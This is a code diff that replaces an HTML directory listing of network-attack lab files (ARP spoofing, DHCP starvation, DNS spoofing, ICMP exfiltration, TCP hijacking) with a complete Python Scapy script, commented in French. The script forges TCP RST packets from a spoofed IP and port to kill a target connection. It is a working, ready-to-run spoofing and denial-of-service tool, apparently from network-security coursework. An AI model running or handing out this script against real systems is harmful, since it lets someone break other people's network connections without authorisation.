@@ -1,47 +1,36 @@
-<!DOCTYPE HTML>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<title>Directory listing for /</title>
-</head>
-<body>
-<h1>Directory listing for /</h1>
-<hr>
-<ul>
-<li><a href="arp_mitm.pcapng">arp_mitm.pcapng</a></li>
-<li><a href="arp_mitm.py">arp_mitm.py</a></li>
-<li><a href="arp_poisonning.py">arp_poisonning.py</a></li>
-<li><a href="arp_spoof.pcapng">arp_spoof.pcapng</a></li>
-<li><a href="bin/">bin/</a></li>
-<li><a href="capture_stp.py">capture_stp.py</a></li>
-<li><a href="dernier.py">dernier.py</a></li>
-<li><a href="dhcp_starv.py">dhcp_starv.py</a></li>
-<li><a href="dhcp_starvation.pcapng">dhcp_starvation.pcapng</a></li>
-<li><a href="dhcp_starvation.py">dhcp_starvation.py</a></li>
-<li><a href="dns_cap.py">dns_cap.py</a></li>
-<li><a href="dns_lookup.py">dns_lookup.py</a></li>
-<li><a href="dns_spoof.py">dns_spoof.py</a></li>
-<li><a href="icmp_basic_exfiltr.py">icmp_basic_exfiltr.py</a></li>
-<li><a href="icmp_basic_receiver.py">icmp_basic_receiver.py</a></li>
-<li><a href="icmp_file_exfilter.py">icmp_file_exfilter.py</a></li>
-<li><a href="icmp_file_exfiltration.pcapng">icmp_file_exfiltration.pcapng</a></li>
-<li><a href="icmp_file_receiver.py">icmp_file_receiver.py</a></li>
-<li><a href="include/">include/</a></li>
-<li><a href="lib/">lib/</a></li>
-<li><a href="lib64/">lib64@</a></li>
-<li><a href="mac_add.py">mac_add.py</a></li>
-<li><a href="ping.py">ping.py</a></li>
-<li><a href="pyvenv.cfg">pyvenv.cfg</a></li>
-<li><a href="share/">share/</a></li>
-<li><a href="stp.py">stp.py</a></li>
-<li><a href="stp_rb.py">stp_rb.py</a></li>
-<li><a href="tcp_cap.py">tcp_cap.py</a></li>
-<li><a href="tcp_hijack.py">tcp_hijack.py</a></li>
-<li><a href="tcp_rst.py">tcp_rst.py</a></li>
-<li><a href="test.py">test.py</a></li>
-<li><a href="test2.py">test2.py</a></li>
-<li><a href="yo.py">yo.py</a></li>
-</ul>
-<hr>
-</body>
-</html>
+from scapy.all import IP, TCP, send
+
+def send_tcp_rst(target_ip, target_port, spoofed_ip, spoofed_port, seq_num):
+    # Créez le paquet IP avec l'adresse IP usurpée
+    ip_layer = IP(src=spoofed_ip, dst=target_ip)
+
+    # Créez le paquet TCP avec le drapeau RST
+    tcp_layer = TCP(
+        sport=spoofed_port,  # Port source (usurpé)
+        dport=target_port,   # Port destination
+        flags="R",           # Flag RST
+        seq=seq_num          # Numéro de séquence attendu par la cible
+    )
+
+    # Combinez les deux couches
+    packet = ip_layer / tcp_layer
+
+    print(f"Sending TCP RST packet: {packet.summary()}")
+    
+    # Envoyez le paquet
+    send(packet, verbose=False)
+
+if __name__ == "__main__":
+    import sys
+
+    if len(sys.argv) != 6:
+        print("Usage: python tcp_rst.py <target_ip> <target_port> <spoofed_ip> <spoofed_port> <seq_num>")
+        sys.exit(1)
+
+    target_ip = sys.argv[1]
+    target_port = int(sys.argv[2])
+    spoofed_ip = sys.argv[3]
+    spoofed_port = int(sys.argv[4])
+    seq_num = int(sys.argv[5])
+
+    send_tcp_rst(target_ip, target_port, spoofed_ip, spoofed_port, seq_num)
